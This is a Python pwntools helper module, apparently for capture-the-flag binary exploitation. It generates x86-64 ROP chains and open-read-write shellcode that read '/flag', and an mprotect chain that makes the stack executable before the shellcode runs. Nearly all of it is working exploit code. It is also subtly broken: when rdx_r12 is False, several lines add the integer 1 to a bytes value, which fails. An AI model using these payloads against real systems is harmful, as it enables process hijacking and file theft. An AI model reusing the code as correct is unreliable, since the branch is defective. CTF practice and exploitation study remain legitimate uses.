
from typing import Optional
from pwnlib.rop.srop import SigreturnFrame
from pwnlib.asm import asm
from pwn import *

def orw_rop(flag_addr: Optional[int] = 0,
            rdi: int = 0,
            rsi: int = 0,
            rdx: int = 0,
            rax: Optional[int] = 0,
            syscall: Optional[int] = 0,
            *,
            sig: Optional[SigreturnFrame] = None,
            rdx_r12: bool = False,
            open_at: bool = False,
            read_addr: Optional[int] = 0,
            write_addr: Optional[int] = 0,
            open_addr: Optional[int] = 0) -> bytes:
    """
    生成 ORW 的 ROP 链。仅适用于 64 位。
    :param flag_addr: '/flag' 的地址
    :param rdi: pop rdi; ret;
    :param rsi: pop rsi; ret;
    :param rdx: pop rdx; ret; 
                或 pop rdx; pop r12; ret; 此时将 rdx_r12 设置为 True
    :param rax: pop rax; ret;
    :param syscall: syscall; ret;
    :param sig: SigreturnFrame，可用于快捷布置 '/flag', 与 flag_addr 二选一
    :param rdx_r12: 使用的是 pop rdx; pop r12; ret; (或是其它 pop 两次的 gadget)
    :param open_at: 使用 openat 而非 open
    :param read_addr: read 的地址，与 (syscall, rax) 二选一
    :param write_addr: write 的地址，与 (syscall, rax) 二选一
    :param open_addr: open 的地址，与 (syscall, rax) 二选一
    :return: ROP 链
    """
    if not (rdi and rsi and rdx):
        raise ValueError('rdi, rsi, rdx cannot be None')
    if syscall and rax:
        open_ = p64(rax) + (p64(257) if open_at else p64(2)) + p64(syscall)  # open
        read_ = p64(rax) + p64(0) + p64(syscall)  # read
        write_ = p64(rax) + p64(1) + p64(syscall)  # write
    elif read_addr and write_addr and open_addr:
        open_ = p64(open_addr)
        read_ = p64(read_addr)
        write_ = p64(write_addr)
    else:
        raise ValueError('You should provide (syscall, rax) or (read_addr, write_addr, open_addr)')
    
    if not flag_addr:
        if not sig:
            raise ValueError('flag_addr and sig cannot be both None')
        flag_addr = sig['rsp'] + 0x8 * 13 + len(open_) + len(read_) + len(write_) + 0x8 * (6 if rdx_r12 else 3)
    
    payload = p64(rsi) + p64(0) + p64(rdx) + (p64(0) * 2 if rdx_r12 else 1) + p64(rdi) + p64(flag_addr) + open_
    payload += p64(rdi) + p64(3) + p64(rsi) + p64(flag_addr) + (p64(0x40) * 2 if rdx_r12 else 1) + read_
    payload += p64(rdi) + p64(1) + p64(rsi) + p64(flag_addr) + (p64(0x40) * 2 if rdx_r12 else 1) + write_
    return payload

def orw_shellcode(ROP_addr: Optional[int] = 0,
                  rdi: int = 0,
                  rsi: int = 0,
                  rdx: int = 0,
                  rax: Optional[int] = 0,
                  syscall: Optional[int] = 0,
                  *,
                  mprotect_addr: Optional[int] = 0,
                  sig: Optional[SigreturnFrame] = None,
                  rdx_r12: bool = False,
                  sc_only: bool = False) -> bytes:
    """
    生成 ORW 的 shellcode。仅适用于 64 位，布置 mprotect rop + shellcode。
    :param ROP_addr: ROP 链的地址
    :param rdi: pop rdi; ret;
    :param rsi: pop rsi; ret;
    :param rdx: pop rdx; ret;
                或 pop rdx; pop r12; ret; 此时将 rdx_r12 设置为 True
    :param rax: pop rax; ret;
    :param syscall: syscall; ret;
    :param mprotect_addr: mprotect 的地址，与 (syscall, rax) 二选一
    :param sig: SigreturnFrame，可用于快捷布置 mprotect rop
    :param rdx_r12: 使用的是 pop rdx; pop r12; ret; (或是其它 pop 两次的 gadget)
    :param sc_only: 仅返回 shellcode
    :return: ROP 链 + shellcode
    """
    sc = asm('''
        mov rax, 0x67616c662f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov eax, 2
        syscall
        
        cmp eax, 0
        js failed
        
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall

        mov edx, eax
        mov rsi, rsp
        mov edi, 1
        mov eax, edi
        syscall

        jmp exit
        
        failed:
        push 0x6c696166
        mov edi, 1
        mov rsi, rsp
        mov edx, 4
        mov eax, edi
        syscall

        exit:
        xor edi, edi
        mov eax, 231
        syscall''', arch='amd64'
        )
    if sc_only:
        return sc
    
    if not (rdi and rsi and rdx):
        raise ValueError('rdi, rsi, rdx cannot be None')
    if syscall and rax:
        mprotect_ = p64(rax) + p64(10) + p64(syscall)  # mprotect
    elif mprotect_addr:
        mprotect_ = p64(mprotect_addr)
    else:
        raise ValueError('You should provide (syscall, rax) or mprotect_addr')
    
    if not ROP_addr:
        if not sig:
            raise ValueError('sc_addr and sig cannot be both None')
        ROP_addr = sig['rsp']

    payload = p64(rdi) + p64(ROP_addr&~0xfff) + p64(rsi) + p64(0x1000) + p64(rdx) + (p64(7)*2 if rdx_r12 else 1) + mprotect_
    payload += p64(len(payload)+ROP_addr+8) + sc
    return payload